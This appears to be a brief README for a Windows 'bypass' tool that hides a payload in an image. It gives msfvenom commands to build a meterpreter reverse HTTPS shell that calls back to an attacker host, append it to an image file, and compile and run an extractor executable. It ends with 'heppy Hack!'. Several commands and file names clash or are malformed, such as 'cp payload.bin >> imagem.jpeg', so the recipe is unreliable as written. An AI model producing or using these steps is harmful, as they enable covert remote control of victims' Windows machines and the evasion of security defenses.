# StenografiaByPassWin

## [1] Command:

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<[IP Connect]> LPORT=8443 -f raw > payload.bin
```

## [2] Command:
```bash
cp payload.bin >> imagem.jpeg
```

## [3] Edit file "extractor-file.cpp"

### Set Path or file to imagem
```c
#define TARGET_FILE_PATH "Image.png";
```


### Set Size bytes File
```c
#define ORIGINAL_FILE_SIZE 6594
```

## compile "extractor-file.cpp" in g++ to .exe

```bash
g++ extract.cpp -o extract.exe
```

or

```bash
x86_64-w64-mingw32-g++ extractor-file.cpp -o extrtact.exe
```

### START extrtact.exe

### heppy Hack!
